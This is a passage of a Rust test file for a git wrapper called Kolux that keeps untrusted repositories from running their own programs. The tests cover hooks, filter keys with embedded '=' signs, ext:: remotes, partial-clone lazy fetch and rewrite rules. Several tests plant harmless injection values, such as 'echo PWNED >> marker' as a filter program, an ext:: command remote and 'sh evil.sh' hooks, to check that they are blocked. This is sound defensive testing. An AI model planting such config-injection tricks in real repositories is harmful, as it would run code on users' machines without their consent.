/// resolution the gate misses comes down to). git itself refuses the file transport and the payload's
/// hook never runs. The control, the same push with every pair but the backstop's, does run the hook.
#[test]
fn t779e_the_file_transport_backstop_holds_when_the_address_changes_after_the_check() {
    let base = temp_repo("e-p8-src");
    let payload = bare_copy(&base, "e-p8-payload");
    let marker = base.join("p8-ran.txt");
    receive_hook(&payload, &marker);
    let dir = temp_repo("e-p8");
    run(&["remote", "add", "origin", "https://example.invalid/a.git"], Some(&dir)).unwrap();
    let args = ["push", "origin", "HEAD:refs/heads/x"];
    let mut cmd = command_checked(&args, Some(&dir)).unwrap();
    assert!(plain_git(&["config", "remote.origin.url", &payload.to_string_lossy()], &dir).status.success());
    let out = cmd.output().unwrap();
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(!out.status.success(), "the push went through");
    assert!(err.contains("transport 'file' not allowed"), "git did not refuse the transport: {err}");
    assert!(!marker.exists(), "the receiving repository's hook ran");
    // The control: without the backstop pair the receiving hook runs, so this test is red without it.
    let found = repo_programs(leading_options(&args), &dir);
    let pairs: Vec<(String, String)> = overrides_for(&found, Access::Reads).into_iter().chain([("push.recurseSubmodules".to_string(), "no".to_string())]).collect();
    let out = base_command(&args, Some(&dir), &pairs, &[]).output().unwrap();
    assert!(!out.status.success(), "the pre-receive hook exits 1");
    assert!(marker.exists(), "the control: without the backstop the receiving repository's hook runs: {}", String::from_utf8_lossy(&out.stderr));
    for d in [&base, &payload, &dir] {
        let _ = fs::remove_dir_all(d);
    }
}

/// Review fix 8 (P1-1): a `pushInsteadOf` rule to a local base is applied by the push alone (`ls-remote
/// --get-url` does not apply it), so the rule itself refuses, for a remote and for a URL argument alike;
/// an `insteadOf` rule the same way; a rule to a remote base is fine.
#[test]
fn t779e_a_rewrite_rule_to_a_local_address_refuses_the_push() {
    let base = temp_repo("e-p8-rw-src");
    let payload = bare_copy(&base, "e-p8-rw-payload");
    let p = payload.to_string_lossy().replace('\\', "/");
    let dir = temp_repo("e-p8-rw");
    run(&["config", &format!("url.{p}.pushInsteadOf"), "https://example.invalid/"], Some(&dir)).unwrap();
    // The premise: git's address lookup leaves the rule out; the push would apply it.
    let shown = plain_git(&["ls-remote", "--get-url", "https://example.invalid/other.git"], &dir);
    assert_eq!(String::from_utf8_lossy(&shown.stdout).trim(), "https://example.invalid/other.git");
    // No remote at all: the URL argument is the one route, and only the rule itself tells where it leads.
    let why = refused(&["push", "https://example.invalid/other.git", "main"], &dir).expect("pushInsteadOf to a local base, URL argument");
    assert!(why.contains("rewrites push addresses") && why.contains("pushinsteadof"), "{why}");
    run(&["remote", "add", "origin", "https://example.invalid/a.git"], Some(&dir)).unwrap();
    assert!(refused(&["push", "origin", "main"], &dir).is_some(), "pushInsteadOf to a local base, remote");
    run(&["config", "--unset", &format!("url.{p}.pushInsteadOf")], Some(&dir)).unwrap();
    run(&["config", "url.https://example.invalid/mirror/.pushInsteadOf", "https://example.invalid/"], Some(&dir)).unwrap();
    assert!(refused(&["push", "origin", "main"], &dir).is_none(), "a rule to a remote base");
    run(&["config", &format!("url.{p}.insteadOf"), "https://example.invalid/"], Some(&dir)).unwrap();
    assert!(refused(&["push", "origin", "main"], &dir).unwrap().contains("insteadof"), "insteadOf to a local base");
    // P3: the same rule in the USER's global config still refuses (it lands on this computer all the same),
    // but the message does not blame the folder.
    run(&["config", "--unset", &format!("url.{p}.insteadOf")], Some(&dir)).unwrap();
    assert!(refused(&["push", "origin", "main"], &dir).is_none(), "no rule left in the folder");
    let global = dir.join("user-gitconfig");
    fs::write(&global, format!("[url \"{p}\"]\n\tpushInsteadOf = https://example.invalid/\n")).unwrap();
    ISOLATED.with(|i| i.set(true));
    GLOBAL_FOR_TEST.with(|g| *g.borrow_mut() = Some(global.clone()));
    let why = refused(&["push", "origin", "main"], &dir).expect("a global rule to a local base");
    GLOBAL_FOR_TEST.with(|g| *g.borrow_mut() = None);
    ISOLATED.with(|i| i.set(false));
    assert!(why.contains("your own git settings (global config) rewrite push addresses") && !why.contains("the folder rewrites"), "{why}");
    for d in [&base, &payload, &dir] {
        let _ = fs::remove_dir_all(d);
    }
}

/// Review fix 8 follow-up (P1): a forced key is handed to GIT_CONFIG_PARAMETERS in git's split form, one
/// quoted word for the key and one for the value, so a `=` inside the key (a filter whose subsection is
/// `a.clean=<program> #`) stays part of the key instead of starting the value. In the one-word form git
/// split it at the first `=`, which set `filter.a.clean` to the program, and `status` ran it (plain git
/// with that word: the premise). The wiring is live: an "inherited" empty GIT_CONFIG_PARAMETERS is enough
/// to make Kolux append its pairs.
#[test]
fn t779_a_forced_key_with_an_equals_sign_stays_one_key() {
    use std::ffi::OsStr;
    let dir = temp_repo("p8-eq");
    let marker = dir.join("..").join(format!("kolux-p8-eq-pwn-{}.txt", std::process::id()));
    let _ = fs::remove_file(&marker);
    let program = format!("echo PWNED >> \"{}\"; cat #", marker.to_string_lossy().replace('\\', "/"));
    let odd_key = format!("filter.a.clean={program}.clean");
    fs::write(dir.join(".gitattributes"), "* filter=a\n").unwrap();
    plain_git(&["add", ".gitattributes"], &dir);
    plain_git(&["-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false", "commit", "-qm", "attrs"], &dir);
    plain_git(&["config", &odd_key, "x"], &dir);
    // A tracked file whose content changed: `diff` re-hashes it through the clean filter every time
    // (`status` may trust a stat under load, which made the premise flaky: review follow-up P3).
    fs::write(dir.join("README.md"), "changed\n").unwrap();
    // The word as Kolux wrote it before, and as it writes it now.
    let old_word = format!("'{odd_key}='");
    let parameters = config_parameters(Some(OsStr::new("")), &[(odd_key.clone(), String::new())]).unwrap();
    let new_word = format!("'{odd_key}'=''");
    assert!(parameters.ends_with(&format!(" {new_word}")), "{parameters}");
    let with = |word: &str, args: &[&str]| {
        let mut c = Command::new("git");
        c.args(args).current_dir(&dir).env("GIT_CONFIG_PARAMETERS", word).env_remove("GIT_CONFIG_COUNT");
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            c.creation_flags(0x0800_0000);
        }
        let out = c.output().unwrap();
        (out.status.code(), String::from_utf8_lossy(&out.stdout).trim_end().to_string())
    };
    // The premise: the one-word form made git run the program on a diff.
    with(&old_word, &["diff"]);
    assert!(marker.exists(), "the premise: plain git splits '{odd_key}=' at the first = and runs the program");
    fs::remove_file(&marker).unwrap();
    // The split form: the full key, as one key, and nothing under `filter.a.clean`.
    let (_, listed) = with(&new_word, &["config", "--show-scope", "--get-regexp", "^filter\\.a"]);
    assert!(listed.lines().any(|l| l == format!("command\t{odd_key}")), "{listed}");
    assert_eq!(with(&new_word, &["config", "--get", "filter.a.clean"]).0, Some(1), "nothing was set under filter.a.clean");
    with(&new_word, &["diff"]);
    assert!(!marker.exists(), "the split form still ran the program");
    // A quote in the key round-trips too.
    let quoted_key = "filter.it's.clean".to_string();
    let word = config_parameters(Some(OsStr::new("")), &[(quoted_key.clone(), String::new())]).unwrap();
    let (_, listed) = with(&word, &["config", "--show-scope", "--get-regexp", "^filter\\.it"]);
    assert!(listed.lines().any(|l| l == format!("command\t{quoted_key}")), "{listed}");
    // Live through Kolux: the folder's odd key is found and blanked, the parent's (empty) list is extended
    // in the split form, and the diff runs nothing. A positive control right before: the same diff still
    // runs the program under the old word.
    with(&old_word, &["diff"]);
    assert!(marker.exists(), "the control: plain git still runs the program on this diff");
    fs::remove_file(&marker).unwrap();
    ISOLATED.with(|i| i.set(true));
    PARENT_ENV_FOR_TEST.with(|p| *p.borrow_mut() = vec![("GIT_CONFIG_PARAMETERS".to_string(), String::new())]);
    let cmd = command(&["diff"], Some(&dir));
    let parameters = cmd.get_envs().find(|(k, _)| *k == "GIT_CONFIG_PARAMETERS").and_then(|(_, v)| v).map(|v| v.to_string_lossy().into_owned()).unwrap_or_default();
    assert!(parameters.contains(&new_word), "{parameters}");
    let diff = run(&["diff"], Some(&dir));
    PARENT_ENV_FOR_TEST.with(|p| p.borrow_mut().clear());
    ISOLATED.with(|i| i.set(false));
    assert!(diff.is_ok(), "{diff:?}");
    assert!(!marker.exists(), "Kolux's git ran the folder's program through GIT_CONFIG_PARAMETERS");
    let _ = fs::remove_file(&marker);
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 8 follow-up (P1): a program key the folder spells in bytes that are not valid text cannot be
/// blanked by name: the environment carries text, so the lossy spelling blanks a key that does not exist
/// while the real one stays live (plain git with that blank runs the program on a diff: the premise). An
/// untrusted run in such a folder is refused, through `run` and through `command`, and nothing runs; a
/// trusted folder's run goes ahead as the user set it up.
#[test]
fn t779_a_program_key_that_is_not_valid_text_refuses_the_untrusted_run() {
    let dir = temp_repo("p8-utf8");
    let marker = dir.join("..").join(format!("kolux-p8-utf8-pwn-{}.txt", std::process::id()));
    let _ = fs::remove_file(&marker);
    let program = format!("echo PWNED >> \"{}\"; cat #", marker.to_string_lossy().replace('\\', "/"));
    let config = dir.join(".git").join("config");
    let mut bytes = fs::read(&config).unwrap();
    bytes.extend_from_slice(b"[filter \"a\xff\"]\n\tclean = ");
    bytes.extend_from_slice(program.as_bytes());
    bytes.push(b'\n');
    fs::write(&config, bytes).unwrap();
    fs::write(dir.join(".gitattributes"), b"* filter=a\xff\n").unwrap();
    fs::write(dir.join("README.md"), "changed\n").unwrap();
    // The premise: the lossy name blanked (as a slot, the one form the environment has), plain git still runs
    // the program the real key names.
    let mut plain = Command::new("git");
    plain.args(["diff"]).current_dir(&dir).env("GIT_CONFIG_COUNT", "1").env("GIT_CONFIG_KEY_0", "filter.a\u{FFFD}.clean").env("GIT_CONFIG_VALUE_0", "").env_remove("GIT_CONFIG_PARAMETERS");
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        plain.creation_flags(0x0800_0000);
    }
    plain.output().unwrap();
    assert!(marker.exists(), "the premise: blanking the lossy name leaves the real key live");
    fs::remove_file(&marker).unwrap();
    // Kolux, untrusted: neither route runs git in the folder.
    let diff = run(&["diff"], Some(&dir));
    let spawned = command(&["diff"], Some(&dir)).output();
    assert!(!marker.exists(), "Kolux's git ran the program under a key it could not blank");
    let why = diff.expect_err("a read under an unreadable program key is refused");
    plain_message(&why, "diff");
    assert!(why.contains("not readable text") && why.contains("filter.a") && why.contains(".clean"), "{why}");
    assert!(spawned.is_err(), "a refused read's command never starts");
    let found = repo_programs(&[], &dir);
    assert!(found.iter().any(|(k, _)| k == UNREADABLE_KEY), "{found:?}");
    // Trusted: the folder's programs are the user's own.
    trust_for_test(&dir);
    assert!(run(&["diff"], Some(&dir)).is_ok());
    let _ = fs::remove_file(&marker);
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 8 (P1-2): a push target that begins with `-` (a `remote.pushDefault` of `--heads`, or the word
/// after `--`) is never handed to a listing git where it would be read as an option; it is refused, since git
/// itself would take the word for a folder.
#[test]
fn t779e_a_push_target_that_looks_like_an_option_is_refused() {
    let dir = temp_repo("e-p8-opt");
    run(&["remote", "add", "origin", "https://example.invalid/a.git"], Some(&dir)).unwrap();
    assert!(refused(&["push", "--", "--heads", "main"], &dir).is_some_and(|w| w.contains("--heads")), "the word after --");
    run(&["config", "remote.pushDefault", "--heads"], Some(&dir)).unwrap();
    let why = refused(&["push"], &dir).expect("an option-like push default");
    assert!(why.contains("--heads") && why.contains("option"), "{why}");
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 8 (P1-3): `origin ` (trailing space) is a remote of its own to git. The gate reads the branch's
/// push remote as written, so it finds that remote's local address where a trimmed name found origin's.
#[test]
fn t779e_a_remote_name_keeps_its_spaces() {
    let base = temp_repo("e-p8-sp-src");
    let payload = bare_copy(&base, "e-p8-sp-payload");
    let marker = base.join("sp-ran.txt");
    receive_hook(&payload, &marker);
    let dir = temp_repo("e-p8-sp");
    run(&["remote", "add", "origin", "https://example.invalid/a.git"], Some(&dir)).unwrap();
    run(&["config", "remote.origin .url", &payload.to_string_lossy()], Some(&dir)).unwrap();
    run(&["checkout", "-q", "-b", "x"], Some(&dir)).unwrap();
    run(&["config", "branch.x.pushRemote", "origin "], Some(&dir)).unwrap();
    run(&["config", "push.default", "current"], Some(&dir)).unwrap();
    // The premise: plain git pushes to the payload through the remote with the space.
    assert!(!plain_git(&["push", "-q"], &dir).status.success());
    assert!(marker.exists(), "the premise: git pushes to the remote `origin `");
    fs::remove_file(&marker).unwrap();
    let why = refused(&["push"], &dir).expect("the push remote `origin ` has a local address");
    assert!(why.contains("on this computer"), "{why}");
    for d in [&base, &payload, &dir] {
        let _ = fs::remove_dir_all(d);
    }
}

/// Review fix 8 (P2-2): a listing the push gate cannot read (a HEAD git cannot follow, where `symbolic-ref`
/// fails rather than says "unset") refuses instead of counting as unset; a detached HEAD, which is "unset",
/// does not.
#[test]
fn t779e_a_push_listing_that_fails_refuses() {
    let dir = temp_repo("e-p8-fail");
    run(&["remote", "add", "origin", "https://example.invalid/a.git"], Some(&dir)).unwrap();
    assert!(refused(&["push"], &dir).is_none());
    assert!(plain_git(&["checkout", "-q", "--detach"], &dir).status.success());
    assert!(refused(&["push"], &dir).is_none(), "a detached HEAD is no branch, and that is all");
    fs::write(dir.join(".git").join("HEAD"), "ref: refs/heads/bad..name\n").unwrap();
    let why = refused(&["push"], &dir).expect("a HEAD git cannot read");
    assert!(why.contains("symbolic-ref") && why.contains("failed"), "{why}");
    fs::write(dir.join(".git").join("HEAD"), "ref: refs/heads/main\n").unwrap();
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 8 (P2-1): a parent's GIT_CONFIG_PARAMETERS is read after the GIT_CONFIG_COUNT slots, and a
/// parent's GIT_ALLOW_PROTOCOL makes git ignore every protocol.*.allow. Kolux's pairs are appended to the
/// first and the transports it switches off are taken out of the second, so neither turns the backstop off.
#[test]
fn t779_a_parents_own_git_environment_never_outranks_kolux() {
    use std::ffi::OsStr;
    let never = vec![("protocol.file.allow".to_string(), "never".to_string())];
    let read = |env: &[(&str, &str)]| {
        let mut c = Command::new("git");
        c.args(["config", "protocol.file.allow"]).env_remove("GIT_CONFIG_COUNT").env_remove("GIT_CONFIG_PARAMETERS");
        for (k, v) in env {
            c.env(k, v);
        }
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            c.creation_flags(0x0800_0000);
        }
        String::from_utf8_lossy(&c.output().unwrap().stdout).trim().to_string()
    };
    // The premise: the slots alone lose to the parent's list.
    assert_eq!(read(&[("GIT_CONFIG_PARAMETERS", "'protocol.file.allow=always'"), ("GIT_CONFIG_COUNT", "1"), ("GIT_CONFIG_KEY_0", "protocol.file.allow"), ("GIT_CONFIG_VALUE_0", "never")]), "always");
    assert_eq!(config_parameters(None, &never), None, "nothing to append to");
    let appended = config_parameters(Some(OsStr::new("'protocol.file.allow=always'")), &never).unwrap();
    assert!(appended.starts_with("'protocol.file.allow=always' 'core.fsmonitor'='false' ") && appended.ends_with(" 'protocol.file.allow'='never'"), "{appended}");
    assert_eq!(read(&[("GIT_CONFIG_PARAMETERS", &appended)]), "never");
    let quoted = config_parameters(Some(OsStr::new("")), &[("a.b".to_string(), "it's".to_string())]).unwrap();
    assert!(quoted.ends_with("'a.b'='it'\\''s'"), "{quoted}");
    assert_eq!(allow_protocol(None, &never), None);
    assert_eq!(allow_protocol(Some(OsStr::new("file:https:ext")), &never).unwrap(), "https");
    assert_eq!(allow_protocol(Some(OsStr::new("file:https")), &[]).unwrap(), "file:https", "a trusted run keeps the parent's list but for ext");
    assert_eq!(allow_protocol(Some(OsStr::new("file:https")), &[("protocol.allow".to_string(), "never".to_string())]).unwrap(), "");
    // Live: git itself refuses the file transport under the filtered list, and allows it under the parent's.
    let src = temp_repo("p8-env-src");
    let dest = std::env::temp_dir().join(format!("kolux-git-p8-env-dest-{}", std::process::id()));
    let _ = fs::remove_dir_all(&dest);
    let clone = |allow: &str| {
        let mut c = Command::new("git");
        c.args(["clone", "-q", &src.to_string_lossy(), &dest.to_string_lossy()]).env("GIT_ALLOW_PROTOCOL", allow);
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            c.creation_flags(0x0800_0000);
        }
        let out = c.output().unwrap();
        (out.status.success(), String::from_utf8_lossy(&out.stderr).to_string())
    };
    let (ok, err) = clone(&allow_protocol(Some(OsStr::new("file:https")), &never).unwrap());
    assert!(!ok && err.contains("transport 'file' not allowed"), "{err}");
    assert!(clone("file:https").0, "the parent's own list allows it");
    let _ = fs::remove_dir_all(&dest);
    let _ = fs::remove_dir_all(&src);
}

/// Review fix 6: a relative core.hooksPath is resolved against the worktree's top level, as git does, so a
/// gc run from a subfolder still sees the hook.
#[test]
fn t779e_a_relative_hooks_path_is_read_from_the_top_level() {
    let dir = temp_repo("e-hp-sub");
    fs::create_dir_all(dir.join(".husky")).unwrap();
    fs::create_dir_all(dir.join("sub")).unwrap();
    run(&["config", "core.hooksPath", ".husky"], Some(&dir)).unwrap();
    fs::write(dir.join(".husky").join("pre-auto-gc"), "#!/bin/sh\nexit 0\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(dir.join(".husky").join("pre-auto-gc"), fs::Permissions::from_mode(0o755)).unwrap();
    }
    assert!(refused(&["gc", "--auto", "--quiet"], &dir.join("sub")).is_some());
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 5 (B4): promisor is a git boolean, and before git 2.45 (which ignores GIT_NO_LAZY_FETCH) every
/// transport is switched off on an untrusted partial clone's read, so its lazy fetch runs nothing.
#[test]
fn t779e_a_partial_clone_read_runs_no_program_on_any_git() {
    let base = temp_repo("e-promisor-src");
    let marker = base.join("lazy-ran.txt");
    let bare = bare_copy(&base, "e-promisor");
    for value in ["1", "yes", "on"] {
        let dir = temp_repo(&format!("e-promisor-{value}"));
        run(&["config", "remote.origin.url", &bare.to_string_lossy()], Some(&dir)).unwrap();
        run(&["config", "remote.origin.promisor", value], Some(&dir)).unwrap();
        let cmd = command(&["show", "HEAD"], Some(&dir));
        assert!(blanked_keys(&cmd).iter().any(|k| k == "protocol.file.allow"), "promisor={value} was not seen");
        let _ = fs::remove_dir_all(&dir);
    }
    // Live: a real partial clone whose blob is missing, with the folder's own upload-pack program.
    let blobless = std::env::temp_dir().join(format!("kolux-git-e-blobless-{}", std::process::id()));
    let _ = fs::remove_dir_all(&blobless);
    assert!(plain_git(&["config", "--file", &bare.join("config").to_string_lossy(), "uploadpack.allowFilter", "true"], &base).status.success());
    assert!(plain_git(&["clone", "-q", "--no-checkout", "--filter=blob:none", &format!("file://{}", bare.to_string_lossy().replace('\\', "/")), &blobless.to_string_lossy()], &base).status.success());
    run(&["config", "remote.origin.uploadpack", &exit_script(&marker)], Some(&blobless)).unwrap();
    let _ = plain_git(&["show", "HEAD:README.md"], &blobless);
    assert!(marker.exists(), "the premise: plain git's read lazy-fetches through the folder's upload-pack");
    fs::remove_file(&marker).unwrap();
    let _ = run(&["show", "HEAD:README.md"], Some(&blobless));
    assert!(!marker.exists(), "Kolux's read ran the folder's upload-pack");
    for d in [&base, &bare, &blobless] {
        let _ = fs::remove_dir_all(d);
    }
}

/// Review fix 5: a folder with its own hooks folder (husky and the like) still gets its background gc when
/// that folder has no pre-auto-gc hook; one that has it is refused. A hook named in config is refused.
#[test]
fn t779e_gc_looks_inside_the_folders_own_hooks_folder() {
    let dir = temp_repo("e-hookspath-gc");
    fs::create_dir_all(dir.join(".husky")).unwrap();
    run(&["config", "core.hooksPath", ".husky"], Some(&dir)).unwrap();
    assert!(refused(&["gc", "--auto", "--quiet"], &dir).is_none(), "a hooks folder without pre-auto-gc");
    assert!(refused(&["commit", "-q", "-m", "x"], &dir).is_some(), "a write is still refused outright");
    fs::write(dir.join(".husky").join("pre-auto-gc"), "#!/bin/sh\nexit 0\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(dir.join(".husky").join("pre-auto-gc"), fs::Permissions::from_mode(0o755)).unwrap();
    }
    assert!(refused(&["gc", "--auto", "--quiet"], &dir).is_some());
    run(&["config", "--unset", "core.hooksPath"], Some(&dir)).unwrap();
    run(&["config", "hook.lint.command", "sh evil.sh"], Some(&dir)).unwrap();
    assert!(refused(&["commit", "-q", "-m", "x"], &dir).unwrap().contains("hook.lint.command"));
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn t779e_local_urls_are_told_from_remote_ones() {
    // Git for Windows' drive rule: one ASCII byte, or one to four high-bit bytes, before the colon (P3).
    for u in ["/srv/x.git", "./evil.git", ".", "..", "file:///x", "C:/repos/x", r"C:\repos\x", "relative/path", "ä:/x", "Ω:x", "d:", "1:x", "_:x", "ää:x", "€:x", "😀:x"] {
        assert!(is_local_url(u), "{u}");
    }
    for u in ["https://github.com/a/b", "ssh://h/x", "git@github.com:a/b.git", "host:path", "ab:/x", "äb:/x", "😀a:x", "ääa:x"] {
        assert!(!is_local_url(u), "{u}");
    }
}

/// B3: `ext::` remotes run a command line of the URL's choosing; the folder's own `protocol.ext.allow`
/// cannot switch them on under Kolux's git (plain git runs it: the premise).
#[test]
fn t779e_ext_remotes_never_run_a_command() {
    let dir = temp_repo("e-ext");
    let marker = dir.join("ext-ran.txt");
    let script = exit_script(&marker);
    run(&["config", "protocol.ext.allow", "always"], Some(&dir)).unwrap();
    run(&["remote", "add", "evil", &format!("ext::{script} %S")], Some(&dir)).unwrap();
    let _ = plain_git(&["ls-remote", "evil"], &dir);
    assert!(marker.exists(), "the premise: plain git runs an ext:: remote's command");
    fs::remove_file(&marker).unwrap();
    let _ = run(&["ls-remote", "evil"], Some(&dir));
    let _ = run(&["fetch", "evil"], Some(&dir));
    assert!(!marker.exists(), "Kolux's git ran an ext:: command");
    let _ = fs::remove_dir_all(&dir);
}

/// B3, B4: a read in an untrusted partial clone fetches nothing on its own and runs no credential helper.
#[test]
fn t779e_reads_in_an_untrusted_partial_clone_never_lazy_fetch() {
    let dir = temp_repo("e-partial");
    run(&["config", "extensions.partialClone", "origin"], Some(&dir)).unwrap();
    run(&["config", "remote.origin.promisor", "true"], Some(&dir)).unwrap();
    let cmd = command(&["show", "HEAD"], Some(&dir));
    assert!(cmd.get_envs().any(|(k, v)| k == "GIT_NO_LAZY_FETCH" && v.is_some_and(|v| v == "1")));
    assert!(blanked_keys(&cmd).iter().any(|k| k == "credential.helper"));
    trust_for_test(&dir);
    let cmd = command(&["show", "HEAD"], Some(&dir));
    assert!(!cmd.get_envs().any(|(k, v)| k == "GIT_NO_LAZY_FETCH" && v.is_some()), "a trusted partial clone fetches as usual");
    let _ = fs::remove_dir_all(&dir);
}

/// B5: a folder's own `core.alternateRefsCommand` never runs, trusted or not (plain git runs it on fetch).
#[test]
fn t779e_the_alternate_refs_command_never_runs() {
    let dir = temp_repo("e-altrefs");
    let marker = dir.join("altrefs-ran.txt");
    let other = temp_repo("e-altrefs-other");
    fs::write(dir.join(".git").join("objects").join("info").join("alternates"), format!("{}\n", other.join(".git").join("objects").to_string_lossy())).unwrap_or_else(|_| {
        fs::create_dir_all(dir.join(".git").join("objects").join("info")).unwrap();
        fs::write(dir.join(".git").join("objects").join("info").join("alternates"), format!("{}\n", other.join(".git").join("objects").to_string_lossy())).unwrap();
    });
    run(&["config", "core.alternateRefsCommand", &exit_script(&marker)], Some(&dir)).unwrap();
    let bare = bare_copy(&other, "e-altrefs");
    run(&["remote", "add", "o", &bare.to_string_lossy()], Some(&dir)).unwrap();
    let _ = plain_git(&["fetch", "o"], &dir);
    assert!(marker.exists(), "the premise: plain git runs core.alternateRefsCommand on fetch");
    fs::remove_file(&marker).unwrap();
    let _ = run(&["fetch", "o"], Some(&dir));
    assert!(!marker.exists(), "Kolux's git ran the folder's core.alternateRefsCommand");
    trust_for_test(&dir);
    let _ = run(&["fetch", "o"], Some(&dir));
    assert!(!marker.exists(), "not even in a trusted folder");
    for d in [&dir, &other, &bare] {
        let _ = fs::remove_dir_all(d);
    }
}

/// B6 (c): the hook is found by its own name, not by listing the folder, so thousands of decoys cannot hide it.
#[test]
fn t779e_a_hook_among_many_decoys_is_still_found() {
    let dir = temp_repo("e-decoys");
    let hooks = dir.join(".git").join("hooks");
    for n in 0..5000 {
        fs::write(hooks.join(format!("a{n:05}")), "").unwrap();
    }
    let marker = dir.join("decoy-ran.txt");
    marker_hook(&dir, "pre-commit", &marker);
    assert!(refused(&["commit", "-q", "-m", "x"], &dir).is_some(), "the hook behind 5000 decoys");
    let _ = fs::remove_dir_all(&dir);
}

/// B6 (a): Git for Windows also runs `<hook>.exe` (review fix 8: its own test).
#[test]
fn t779e_a_hook_with_an_exe_suffix_is_found_on_windows() {
    if !cfg!(windows) {
        return;
    }
    let dir = temp_repo("e-hook-exe");
    let marker = dir.join("exe-ran.txt");
    marker_hook(&dir, "pre-commit.exe", &marker);
    assert!(refused(&["commit", "-q", "-m", "x"], &dir).is_some(), "Git for Windows would run pre-commit.exe");
    let _ = fs::remove_dir_all(&dir);
}

/// B6 (b): NTFS matches a hook's name whatever its letter case, and so git runs `PRE-COMMIT` as pre-commit
/// (review fix 8: its own test, with plain git as the premise).
#[test]
fn t779e_a_hook_in_another_letter_case_is_found_on_windows() {
    if !cfg!(windows) {
        return;
    }
    let dir = temp_repo("e-hook-case");
    let marker = dir.join("case-ran.txt");
    marker_hook(&dir, "PRE-COMMIT", &marker);
    assert!(plain_git(&["commit", "-q", "--allow-empty", "-m", "x"], &dir).status.success());
    assert!(marker.exists(), "the premise: Git for Windows runs PRE-COMMIT");
    assert!(refused(&["commit", "-q", "-m", "x"], &dir).is_some(), "Git for Windows would run PRE-COMMIT");
    let _ = fs::remove_dir_all(&dir);
}

/// Review should-fix: a merge driver of the folder's own is blanked on a read (merge-tree's forecast),
/// and kept for a trusted folder's own merge.
#[test]
fn t779e_merge_drivers_are_blanked_on_reads() {
    let found = vec![("merge.evil.driver".to_string(), "evil %O %A %B".to_string())];
    assert!(overrides_for(&found, Access::Reads).iter().any(|(k, v)| k == "merge.evil.driver" && v.is_empty()));
    assert!(overrides_for(&found, Access::TrustedWrite).is_empty());
    let alt = vec![("core.alternaterefscommand".to_string(), "x".to_string())];
    assert!(overrides_for(&alt, Access::TrustedWrite).iter().any(|(k, _)| k == "core.alternaterefscommand"));
}
